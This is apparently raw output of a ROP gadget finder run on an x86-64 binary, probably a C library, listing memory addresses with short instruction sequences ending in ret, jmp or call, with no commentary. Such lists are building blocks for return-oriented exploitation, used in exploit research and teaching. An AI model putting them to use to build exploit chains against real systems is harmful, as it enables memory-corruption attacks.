0x00002aaaaab62a99 : mov edx, 0xf480001 ; ret 0x66c3
0x00002aaaaac43829 : mov edx, 0xf66bab2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab02904 : mov edx, 0xffffffff ; cmove rax, rdx ; ret
0x00002aaaaaaf8b87 : mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x00002aaaaab44f7e : mov edx, 0xffffffff ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaabe13d8 : mov edx, 0xffffffff ; mov eax, edx ; ret
0x00002aaaaac10398 : mov edx, 0xffffffff ; mov rsi, rbx ; mov rdi, rbp ; call rcx
0x00002aaaaab0f6ef : mov edx, 0xffffffff ; test eax, eax ; cmovs eax, edx ; pop rbx ; ret
0x00002aaaaac0f89c : mov edx, 0xffffffff ; xor eax, eax ; call r8
0x00002aaaaac0f8e6 : mov edx, 0xffffffff ; xor eax, eax ; call rcx
0x00002aaaaabd7aa1 : mov edx, 4 ; mov esi, 1 ; call rbx
0x00002aaaaac073ac : mov edx, 5 ; call 0x2e627
0x00002aaaaaaf68a0 : mov edx, 8 ; mov eax, edx ; ret
0x00002aaaaac7f1c4 : mov edx, dr0 ; add byte ptr [rax], al ; clc ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaabe8720 : mov edx, dword ptr [r13 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r14 ; call rax
0x00002aaaaabe8632 : mov edx, dword ptr [r13 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe82af : mov edx, dword ptr [r13 - 0x30] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe893a : mov edx, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaab4c465 : mov edx, dword ptr [rax + 0x18] ; mov qword ptr [rax + 0x20], rdx ; pop rbx ; ret
0x00002aaaaaba093c : mov edx, dword ptr [rax + 0x18] ; test rdx, rdx ; je 0xcb951 ; call rdx
0x00002aaaaab47fe1 : mov edx, dword ptr [rax + 0xa0] ; mov rdi, qword ptr [rdx + 0x40] ; jmp 0x72fbb
0x00002aaaaab1d030 : mov edx, dword ptr [rax + rax*8] ; mov qword ptr [rsi + rax*8], rdx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab81f14 : mov edx, dword ptr [rax] ; cmp edx, esi ; je 0xacf29 ; test edx, edx ; jne 0xacf1b ; ret
0x00002aaaaab46f88 : mov edx, dword ptr [rax] ; mov eax, edx ; pop rbx ; ret
0x00002aaaaaaf5827 : mov edx, dword ptr [rax] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaabe8721 : mov edx, dword ptr [rbp + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r14 ; call rax
0x00002aaaaabe8633 : mov edx, dword ptr [rbp + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe82b0 : mov edx, dword ptr [rbp - 0x30] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe8787 : mov edx, dword ptr [rbx + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r12 ; call rax
0x00002aaaaab4d770 : mov edx, dword ptr [rbx + 0x40] ; sub rdx, rsi ; mov rdi, rbx ; call rax
0x00002aaaaabe8c4d : mov edx, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r13 ; call rax
0x00002aaaaabecaaf : mov edx, dword ptr [rbx] ; jmp 0x117a78
0x00002aaaaac1c9cf : mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaac1b0fd : mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaabe8e6f : mov edx, dword ptr [rdi + 0x28] ; xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaab4900e : mov edx, dword ptr [rdi + 0x40] ; sub rdx, rsi ; mov rdi, r15 ; call rax
0x00002aaaaab4a4c6 : mov edx, dword ptr [rdi + 0xc0] ; mov eax, edx ; ret
0x00002aaaaabe95b1 : mov edx, dword ptr [rdi + 8] ; mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
0x00002aaaaab0b266 : mov edx, dword ptr [rdi] ; xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaac0224c : mov edx, dword ptr [rdx + 0x38] ; test rdx, rdx ; je 0x12d264 ; mov rdi, rbp ; call rdx
0x00002aaaaab02eb0 : mov edx, dword ptr [rdx + 0x48] ; mov eax, dword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaab02e80 : mov edx, dword ptr [rdx + 0x58] ; mov eax, dword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaab5dac5 : mov edx, dword ptr [rdx + 8] ; test rdx, rdx ; jne 0x88ac9 ; ret
0x00002aaaaac48270 : mov edx, dword ptr [rdx + rbp*8] ; test rdx, rdx ; je 0x173282 ; call rdx
0x00002aaaaabddb24 : mov edx, dword ptr [rip + 0x2bd88e] ; add word ptr [rdx + rax*2], 1 ; ret
0x00002aaaaabbeab1 : mov edx, dword ptr [rip + 0x2d94b1] ; mov dword ptr [rdx], ecx ; pop rdx ; pop rcx ; pop rbx ; ret
0x00002aaaaab5d9d9 : mov edx, dword ptr [rip + 0x33a579] ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab5d721 : mov edx, dword ptr [rip + 0x33a831] ; mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaab5d669 : mov edx, dword ptr [rip + 0x33a8e9] ; mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaab03195 : mov edx, dword ptr [rip + 0x394d95] ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaabe893b : mov edx, dword ptr [rsi + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabcacd7 : mov edx, dword ptr [rsi + 0x78] ; mov qword ptr [rdi + 0x100], rdx ; ret
0x00002aaaaabca33a : mov edx, dword ptr [rsi + 0x78] ; mov qword ptr [rdi + 0x80], rdx ; ret
0x00002aaaaac2fbc0 : mov edx, dword ptr [rsi + 1] ; mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fb50 : mov edx, dword ptr [rsi + 2] ; mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a1e2 : mov edx, dword ptr [rsi + 3] ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x00002aaaaac2fae0 : mov edx, dword ptr [rsi + 3] ; mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a1d3 : mov edx, dword ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7a244 : mov edx, dword ptr [rsi + 5] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7a254 : mov edx, dword ptr [rsi + 6] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7a223 : mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7a264 : mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x00002aaaaab8f66d : mov edx, dword ptr [rsi + 8] ; cmp dword ptr [rdi + 8], edx ; jne 0xba656 ; ret
0x00002aaaaab7a233 : mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7a214 : mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaac271e1 : mov edx, dword ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00002aaaaac275a0 : mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac271d4 : mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac273b4 : mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27594 : mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26ff4 : mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab8f69c : mov edx, dword ptr [rsi - 4] ; test edx, edx ; mov dword ptr [rsi + rcx], edx ; jne 0xba6a3 ; ret
0x00002aaaaac26e15 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27785 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27985 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27b85 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac26e31 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab7b7b0 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7c5e0 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7a1b0 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab7e050 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; xor ch, ch ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab7b801 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7c631 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7a1f1 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab7e0a1 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; xor ch, ch ; mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaab7b791 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7c5b1 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a191 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab7e021 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; xor ch, ch ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaabe32f0 : mov edx, dword ptr [rsp + 0x10] ; mov edi, 0x2000004 ; call rax
0x00002aaaaabe31ec : mov edx, dword ptr [rsp + 0x10] ; mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaab12fe2 : mov edx, dword ptr [rsp + 0x18] ; call 0x3c0aa
0x00002aaaaab12fe1 : mov edx, dword ptr [rsp + 0x18] ; call 0x3c0ab
0x00002aaaaab8eb3d : mov edx, dword ptr [rsp + 0x20] ; mov rsi, r14 ; mov rdi, r12 ; call rbx
0x00002aaaaab58d39 : mov edx, dword ptr [rsp + 0x68] ; call rax
0x00002aaaaab5a0c9 : mov edx, dword ptr [rsp + 0x68] ; mov rsi, r13 ; mov rdi, rbx ; call rax
0x00002aaaaab0cd64 : mov edx, dword ptr [rsp + 8] ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaab0e1a4 : mov edx, dword ptr [rsp + 8] ; mov rsi, r15 ; mov rdi, r13 ; call r14
0x00002aaaaab45105 : mov edx, eax ; je 0x70117 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabe3884 : mov edx, eax ; jmp 0x10e896
0x00002aaaaabe3b8f : mov edx, eax ; jmp 0x10eb9d
0x00002aaaaac091d7 : mov edx, eax ; jmp 0x13419b
0x00002aaaaab461f7 : mov edx, eax ; jmp 0x7118b
0x00002aaaaab46388 : mov edx, eax ; jmp 0x71322
0x00002aaaaab4abe3 : mov edx, eax ; jmp 0x75b80
0x00002aaaaab4b533 : mov edx, eax ; jmp 0x764d0
0x00002aaaaab4bcd0 : mov edx, eax ; jmp 0x76c57
0x00002aaaaab4d0eb : mov edx, eax ; jmp 0x78081
0x00002aaaaab529c4 : mov edx, eax ; jmp 0x7d9e1
0x00002aaaaab5bc90 : mov edx, eax ; jmp 0x86c5b
0x00002aaaaab92fb8 : mov edx, eax ; jmp 0xbdfc1
0x00002aaaaaba4892 : mov edx, eax ; jmp 0xcf831
0x00002aaaaaba95b9 : mov edx, eax ; jmp 0xd45d8
0x00002aaaaababa9c : mov edx, eax ; jmp 0xd6a7a
0x00002aaaaabadc2c : mov edx, eax ; jmp 0xd8c3b
0x00002aaaaabb5416 : mov edx, eax ; jmp 0xe03b0
0x00002aaaaabc445c : mov edx, eax ; jmp 0xef494
0x00002aaaaabd290c : mov edx, eax ; jmp 0xfd8a0
0x00002aaaaab4a513 : mov edx, eax ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab5183e : mov edx, eax ; mov rax, qword ptr [rdx] ; test rax, rax ; jne 0x7c843 ; ret
0x00002aaaaabcba8f : mov edx, eax ; neg edx ; cmp dword ptr [rsp - 0x58], 2 ; cmove eax, edx ; ret
0x00002aaaaac17eee : mov edx, ebp ; add r9, qword ptr [rbp - 0x88] ; call rax
0x00002aaaaab0c8b7 : mov edx, ebp ; call r15
0x00002aaaaabe8b17 : mov edx, ebp ; call rax
0x00002aaaaab81c68 : mov edx, ebp ; lea r9, qword ptr [rsp + 0x70] ; mov rdi, r12 ; call rbx
0x00002aaaaab81802 : mov edx, ebp ; mov rdi, rbp ; call rbx
0x00002aaaaaaf6853 : mov edx, ebp ; mov rsi, qword ptr [rsp + 0x18] ; mov r9, r14 ; call rbx
0x00002aaaaab0d37c : mov edx, ebp ; mov rsi, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call r15
0x00002aaaaab0c318 : mov edx, ebp ; mov rsi, r12 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaabc844f : mov edx, ebp ; mov rsi, r12 ; mov rdi, rbp ; call 0xef75a
0x00002aaaaab0c341 : mov edx, ebp ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaac03923 : mov edx, ebp ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab8e9af : mov edx, ebp ; mov rsi, r14 ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaab5cd87 : mov edx, ebp ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaab5d2a9 : mov edx, ebp ; mov rsi, rbp ; call rax
0x00002aaaaab0c35c : mov edx, ebp ; mov rsi, rbx ; mov rdi, r12 ; call r15
0x00002aaaaabe82b7 : mov edx, ebx ; call rax
0x00002aaaaac48987 : mov edx, ebx ; jne 0x17397e ; pop rbx ; ret
0x00002aaaaac03815 : mov edx, ebx ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab5cca8 : mov edx, ecx ; jmp 0x87c71
0x00002aaaaab5c559 : mov edx, edi ; call rax
0x00002aaaaab47288 : mov edx, edi ; jbe 0x72202 ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab0f630 : mov edx, edi ; mov eax, edi ; sar edx, 0x1f ; xor eax, edx ; sub eax, edx ; ret
0x00002aaaaab38b64 : mov edx, edi ; mov rsi, qword ptr [rip + 0x35f403] ; call rax
0x00002aaaaabf12ff : mov edx, edi ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaaba7531 : mov edx, edx ; mov qword ptr [rbp - 0x2888], rsi ; sub r10, rax ; jmp 0xd255e
0x00002aaaaabe8728 : mov edx, esi ; call rax
0x00002aaaaabe878e : mov edx, esp ; call rax
0x00002aaaaab819a7 : mov edx, esp ; lea r9, qword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00002aaaaab816de : mov edx, esp ; lea r9, qword ptr [rsp + 0x70] ; mov rdi, rbp ; call rbx
0x00002aaaaab5c043 : mov edx, esp ; mov rdi, r15 ; call rax
0x00002aaaaac78dad : mov es, word ptr [rax] ; add al, dl ; mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaabdf1b9 : mov es, word ptr [rbx] ; add al, 0x11 ; ret
0x00002aaaaac311a7 : mov es, word ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac7f34c : mov es, word ptr [rcx*4 + 0x44068c05] ; add dword ptr [rdi], 2 ; ret
0x00002aaaaac8448c : mov es, word ptr [rcx*4 + 0x48068c05] ; add dword ptr [rdi], 2 ; cwde ; ret
0x00002aaaaac86a5e : mov es, word ptr [rdx] ; add ah, bh ; ret
0x00002aaaaab36cfc : mov es, word ptr [rdx] ; add byte ptr [rax - 0x7d], cl ; clc ; adc byte ptr [rax - 0x77], cl ; ret 0x860f
0x00002aaaaabd7f66 : mov es, word ptr [rip - 0x9cf0000] ; mov rdi, r13 ; call rbx
0x00002aaaaab7c3fe : mov es, word ptr [rsi] ; add byte ptr [rax], al ; ret
0x00002aaaaab5f868 : mov esi, 0x1f0fc3c2 ; add byte ptr [rax], r8b ; xor eax, eax ; ret
0x00002aaaaab73066 : mov esi, 0x39410704 ; rol byte ptr [rcx + 0xf], 1 ; xchg eax, esp ; ret 0x3941
0x00002aaaaab5cb33 : mov esi, 0x3948feda ; ret 0x3574
0x00002aaaaab8092e : mov esi, 0x48000000 ; lea eax, dword ptr [rdi - 0x10] ; ret
0x00002aaaaaaf8ac9 : mov esi, 0x48891b52 ; push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaabfbb3b : mov esi, 0x5c415d5b ; pop r13 ; pop r14 ; ret
0x00002aaaaac594fa : mov esi, 0x5fd2fe07 ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00002aaaaac2dc57 : mov esi, 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6a6cc : mov esi, 0x64fffca7 ; cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; call rsp
0x00002aaaaab73091 : mov esi, 0x74c08407 ; and al, 0x39 ; ret 0x2574
0x00002aaaaab72f51 : mov esi, 0x74c08407 ; sub edi, dword ptr [rcx] ; ret 0x2774
0x00002aaaaab730b5 : mov esi, 0x75c9840f ; in eax, dx ; xor eax, eax ; ret
0x00002aaaaaba7672 : mov esi, 0x75f6850b ; add eax, 0x740e3941 ; ret
0x00002aaaaab254b3 : mov esi, 0x77cf390e ; fild word ptr [rcx + rcx*4 - 0x40] ; ret
0x00002aaaaac7bd4d : mov esi, 0x7f200000 ; out dx, eax ; call qword ptr [rdi]
0x00002aaaaabfcff7 : mov esi, 0x83480153 ; ret
0x00002aaaaab72fce : mov esi, 0x84450704 ; sal byte ptr [rbp - 0x26], 0xf3 ; ret
0x00002aaaaabc6152 : mov esi, 0x89010544 ; ret
0x00002aaaaab5be85 : mov esi, 0x8948feda ; and byte ptr [rax + 0x31], cl ; ret 0x93be
0x00002aaaaabd8a33 : mov esi, 0x8b49fff1 ; call rbx
0x00002aaaaab61c5f : mov esi, 0x8c48348 ; ret
0x00002aaaaab9464b : mov esi, 0x8d480141 ; jl 0xbf6ac ; ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaab126df : mov esi, 0xbe0f2414 ; ret 0x8349
0x00002aaaaab7310d : mov esi, 0xc0844507 ; jne 0x9e0f9 ; xor eax, eax ; ret
0x00002aaaaac5615e : mov esi, 0xc2c1c0bf ; ret
0x00002aaaaabe3040 : mov esi, 0xc48348c3 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac1095a : mov esi, 0xc7ffff ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac5d604 : mov esi, 0xc8fff451 ; push rcx ; hlt ; call rdx
0x00002aaaaab72f75 : mov esi, 0xc984070c ; jne 0x9df70 ; ret
0x00002aaaaab72f31 : mov esi, 0xd2840714 ; jne 0x9df30 ; ret
0x00002aaaaab7efe4 : mov esi, 0xf000000 ; lahf ; ret 0xea81
0x00002aaaaabdce7e : mov esi, 0xf000822 ; mov bh, 0xff ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaabd3d76 : mov esi, 0xf233c03 ; xchg eax, ebp ; ret 0x2f3c
0x00002aaaaab73005 : mov esi, 0xf2390714 ; je 0x9e008 ; ret
0x00002aaaaac43529 : mov esi, 0xf66beb2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaaad7bf1 : mov esi, 0xf8cbeb8f ; ret
0x00002aaaaabf13f6 : mov esi, 0xfb83014f ; or dword ptr [rdi], ecx ; ret
0x00002aaaaabd7aa6 : mov esi, 1 ; call rbx
0x00002aaaaac07437 : mov esi, 1 ; mov ebp, eax ; call 0x12e719
0x00002aaaaabd7c93 : mov esi, 1 ; mov rdi, r12 ; call rbx
0x00002aaaaabd7b5f : mov esi, 1 ; mov rdi, r13 ; call rbx
0x00002aaaaabd7ad7 : mov esi, 1 ; mov rdi, r14 ; call rbx
0x00002aaaaabd7f1d : mov esi, 1 ; mov rdi, rbp ; call rbx
0x00002aaaaab41b43 : mov esi, 1 ; mov rdi, rbx ; call r8
0x00002aaaaab41430 : mov esi, 1 ; mov rdi, rbx ; call rax
0x00002aaaaabd6c91 : mov esi, 2 ; jmp rax
0x00002aaaaabd7f11 : mov esi, 2 ; mov rdi, r12 ; call rbx
0x00002aaaaabd7c84 : mov esi, 2 ; mov rdi, r13 ; call rbx
0x00002aaaaabd7b50 : mov esi, 2 ; mov rdi, r14 ; call rbx
0x00002aaaaabd7ac8 : mov esi, 2 ; mov rdi, r15 ; call rbx
0x00002aaaaabd6cab : mov esi, 3 ; jmp rax
0x00002aaaaabd848c : mov esi, 3 ; mov rdi, r12 ; call rbx
0x00002aaaaabd84e3 : mov esi, 3 ; mov rdi, r13 ; call rbx
0x00002aaaaabd8563 : mov esi, 3 ; mov rdi, r14 ; call rbx
0x00002aaaaabd8663 : mov esi, 3 ; mov rdi, r15 ; call rbx
0x00002aaaaababa93 : mov esi, dword ptr [r14 + rsi*4] ; cmp r8d, esi ; jge 0xd6a7a ; mov edx, eax ; jmp 0xd6a83
0x00002aaaaab51c18 : mov esi, dword ptr [rax + rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab51ba5 : mov esi, dword ptr [rax + rax] ; add dword ptr [rip + 0x348bb5], 1 ; ret
0x00002aaaaab91e5e : mov esi, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab34b81 : mov esi, dword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rax], edi ; jmp 0x5fb58
0x00002aaaaab37800 : mov esi, dword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rax], edi ; jmp 0x627d7
0x00002aaaaab35455 : mov esi, dword ptr [rbp - 0x5f0] ; mov dword ptr fs:[rcx], eax ; jmp 0x6042c
0x00002aaaaab0df6a : mov esi, dword ptr [rdi] ; mov rdi, qword ptr [r13] ; call r14
0x00002aaaaab38b67 : mov esi, dword ptr [rip + 0x35f403] ; call rax
0x00002aaaaab30e59 : mov esi, dword ptr [rip + 0x367111] ; call rax
0x00002aaaaab30803 : mov esi, dword ptr [rip + 0x367767] ; call rax
0x00002aaaaab2504b : mov esi, dword ptr [rip + 0x372f1f] ; call rax
0x00002aaaaab223cf : mov esi, dword ptr [rip + 0x375b9b] ; call rax
0x00002aaaaab1cf4a : mov esi, dword ptr [rsi + 0x70] ; xor eax, eax ; ret
0x00002aaaaababa94 : mov esi, dword ptr [rsi + rsi*4] ; cmp r8d, esi ; jge 0xd6a79 ; mov edx, eax ; jmp 0xd6a82
0x00002aaaaac21f69 : mov esi, dword ptr [rsi] ; mov dword ptr [rdi], esi ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab73fea : mov esi, dword ptr [rsi] ; mov ecx, dword ptr [rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaac21f4b : mov esi, dword ptr [rsi] ; mov qword ptr [rdi], rsi ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaac21f7d : mov esi, dword ptr [rsi] ; mov word ptr [rdi], si ; mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaac00438 : mov esi, dword ptr [rsp + 0x10] ; mov rdi, rbp ; call r14
0x00002aaaaab586e9 : mov esi, dword ptr [rsp + 0x18] ; add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaaaf6856 : mov esi, dword ptr [rsp + 0x18] ; mov r9, r14 ; call rbx
0x00002aaaaab81ab5 : mov esi, dword ptr [rsp + 0x18] ; mov rcx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaab0d37f : mov esi, dword ptr [rsp + 0x18] ; mov rdi, r12 ; call r15
0x00002aaaaab81d65 : mov esi, dword ptr [rsp + 0x18] ; mov rdi, r12 ; mov r9, r15 ; call rbx
0x00002aaaaab817fd : mov esi, dword ptr [rsp + 0x18] ; mov rdx, r13 ; mov rdi, rbp ; call rbx
0x00002aaaaaaf906c : mov esi, dword ptr [rsp + 0x20] ; mov rdi, qword ptr [rsp + 0x18] ; call r12
0x00002aaaaaafdab5 : mov esi, dword ptr [rsp + 0x28] ; mov rdi, qword ptr [rsp + 0x20] ; call r14
0x00002aaaaaaf8e4c : mov esi, dword ptr [rsp + 0x28] ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00002aaaaab59401 : mov esi, dword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00002aaaaaaf9800 : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r12
0x00002aaaaaafa58b : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00002aaaaaafa34b : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call r15
0x00002aaaaaaf98b4 : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00002aaaaaafd2aa : mov esi, dword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafab53 : mov esi, dword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafd043 : mov esi, dword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaab58a31 : mov esi, dword ptr [rsp + 0x48] ; call rax
0x00002aaaaaafb863 : mov esi, dword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaab901fb : mov esi, dword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x68] ; call r12
0x00002aaaaabe31f1 : mov esi, dword ptr [rsp + 8] ; call rax
0x00002aaaaabf4369 : mov esi, dword ptr [rsp + 8] ; mov rdi, r13 ; call r12
0x00002aaaaab6af3a : mov esi, dword ptr [rsp] ; test rsi, rsi ; jne 0x95f55 ; jmp 0x95f0f
0x00002aaaaab42712 : mov esi, eax ; add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x3549
0x00002aaaaac173ef : mov esi, eax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab4ba42 : mov esi, ebp ; call 0x4d179
0x00002aaaaab5d2ac : mov esi, ebp ; call rax
0x00002aaaaab81126 : mov esi, ebp ; lea r9, qword ptr [rsp + 0x20] ; lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaabc40f3 : mov esi, ebp ; mov rdi, rbx ; call 0x3b3c7
0x00002aaaaab91e78 : mov esi, ebp ; mov rdi, rbx ; call 0x89167
0x00002aaaaab5a0ce : mov esi, ebp ; mov rdi, rbx ; call rax
0x00002aaaaab9c90c : mov esi, ebp ; xor edx, edx ; jmp 0xc78da
0x00002aaaaab0c35f : mov esi, ebx ; mov rdi, r12 ; call r15
0x00002aaaaac0cded : mov esi, ebx ; mov rdi, r15 ; call qword ptr [rax]
0x00002aaaaac0ec7b : mov esi, ebx ; mov rdi, r15 ; call r14
0x00002aaaaab5bbf7 : mov esi, ebx ; mov rdi, rax ; call rcx
0x00002aaaaab5aef9 : mov esi, ebx ; mov rdi, rax ; mov rbp, rax ; call 0x8218a
